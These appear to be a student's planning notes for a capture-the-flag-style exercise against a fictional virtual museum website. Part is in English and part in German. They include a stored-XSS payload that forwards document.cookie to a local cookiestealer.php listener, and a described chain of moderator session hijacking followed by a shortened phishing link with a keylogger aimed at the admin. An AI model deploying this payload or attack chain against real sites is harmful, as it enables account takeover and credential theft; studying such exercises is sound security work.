# Notes
Where do i have to inject the eval command for executing the script? At the point where the inner html gets called. Need to get session cookie. For that i need to create a session cookie. 
document.location = "http://127.0.0.1:4859/cookiestealer.php?c=" + document.cookie;document.cookie = "username=Null Byte";document.write(document.cookie);
W


# Action plan
1. Create post in forum who contains malicous script
2. If someone goes on this post session cookie from gets forwarded to the attacker
3. 

# Code
1. create post in **Forum.html** with **post_erstellen.html**. Forum post is visible in **PostAngreifer.html**
2. call an alert from field input

# Unser Szenario:
Es existiert ein virtuelles Museum mit allerhand Berühmtheiten aus dem IT-Bereich. Jeder User kann dieses besuchen ohne einen Account zu haben. Zusätzlich gibt es noch ein Forum, wo Interaktion zwischen den Usern und Moderatoren stattfindet. Des weiteren hat das Museum bisher unveröffentlichte Dokumente zu diesen Personen (Tagebuchinhalte, unbekannte Forschungen, etc...) in separaten, für die Öffentlichkeit nicht zugänglichen Bereichen (Kisten) gespeichert.

1. Angriffsschritt:
Der Angriff basiert darauf, sich die Identität eines Moderators zu stehlen. Dazu postet der Angreifer einen Beitrag im Forum, worin sich ein XSS-Skript befindet, welches sofort ausgeführt wird, sobal die Seite läd. Sobald dies ein Moderator getan hat, erlangt der Angreifer dessen Session-Cookie. 

2. Angriffsschritt:
Mit Hilfe des Session-Cookies postet der Angreifer im Namen des Moderators eine Anfrage in einem Unterforum, welches nur zugänglich für Moderatoren und den Admin ist. In dieser Anfrage geht es um eine geheime Information aus der Kiste. Der Post sieht ungefähr so aus: "Lieber Admin, ich brauche Info xyz aus folgender Kiste: [Schadhafter Link] "
In diesem Link ist ein Keylogger enthalten, damit dies nicht auffällt wird der Link mit einem Programm (zB. bitly) gekürzt. Da dies auch ein privater Forumsbereich ist, schöpft der Admin keinen Verdacht und öffnet diesen Link. Er wird dann zur Kiste weitergeleitet & zur Passworteingabe aufgefordert. Nachdem dieses eingegeben wurde liest der Admin, dass diese Info nur für Admins bestimmt ist und weist die Anfrage zurück. Allerdings hat der ANgreifer nun das Kistenpasswort und erlangt die Info -> Challenge done